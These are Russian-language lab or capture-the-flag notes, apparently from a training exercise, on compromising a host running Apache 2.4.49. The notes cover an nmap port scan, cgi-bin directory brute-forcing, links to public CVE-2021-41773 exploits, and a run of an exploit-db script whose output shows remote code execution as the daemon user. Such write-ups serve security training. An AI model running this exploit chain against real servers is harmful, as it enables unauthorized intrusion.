 

#### scout 

Нас интересует  порт 8080
```
 nmap -p- -T5 10.124.1.232
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-28 11:09 EDT
Nmap scan report for calculator.edu.stf (10.124.1.232)
Host is up (0.020s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1720/tcp open  h323q931
8080/tcp open  http-proxy

```

Видим Сервер Apache HTTP Server 2.4.49
![[Pasted image 20240928180806.png]]


+ Сканирование каталогов на порту 80
```
[####################] - 9s     20469/20469   2168/s  http://10.124.1.232:8080/ 
[####################] - 11s    20469/20469   1821/s  http://10.124.1.232:8080/cgi-bin/ 
[####################] - 11s    20469/20469   1786/s  http://10.124.1.232:8080/cgi-bin/cgi-bin/ 
[####################] - 10s    20469/20469   2022/s  http://10.124.1.232:8080/cgi-bin/cgi-bin/cgi-bin/  
```
 
#### 1 exploits 
https://github.com/thehackersbrain/CVE-2021-41773/tree/main

####  2 exploits 
https://www.exploit-db.com/exploits/50512
```
└─$ python3  ex2.py 10.124.1.232 8080

                                                                                                                    
     ▄▄▄       ██▓███   ▄▄▄       ▄████▄   ██░ ██ ▓█████     ██▀███   ▄████▄  ▓█████                                
    ▒████▄    ▓██░  ██▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀    ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                                
    ▒██  ▀█▄  ▓██░ ██▓▒▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███      ▓██ ░▄█ ▒▒▓█    ▄ ▒███                                  
    ░██▄▄▄▄██ ▒██▄█▓▒ ▒░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄    ▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                                
    ▓█   ▓██▒▒██▒ ░  ░ ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒   ░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                                
    ▒▒   ▓▒█░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░   ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                                
    ▒   ▒▒ ░░▒ ░       ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░     ░▒ ░ ▒░  ░  ▒    ░ ░  ░                                 
    ░   ▒   ░░         ░   ▒   ░         ░  ░░ ░   ░        ░░   ░ ░           ░                                    
                                                                                                                    
[0] Apache 2.4.49 RCE
[1] Apache 2.4.50 RCE                                                                                               
[~] Choice : 0                                                                                                      
                                                                                                                    
[!] Target 10.124.1.232 is vulnerable !!!                                                                           
[!] Sortie:                                                                                                         
                                                                                                                    
uid=1(daemon) gid=1(daemon) groups=1(daemon)                                                                        
                                                                                                                    
[?] Do you want to exploit this RCE ? (Y/n) : Y                                                                     
Reverse shell is advised (This isn't an interactive shell)                                                          
╭─daemon@calculator.edu.stf: /usr/bin                                                                               
╰─$ id                                                                                                              
uid=1(daemon) gid=1(daemon) groups=1(daemon)

```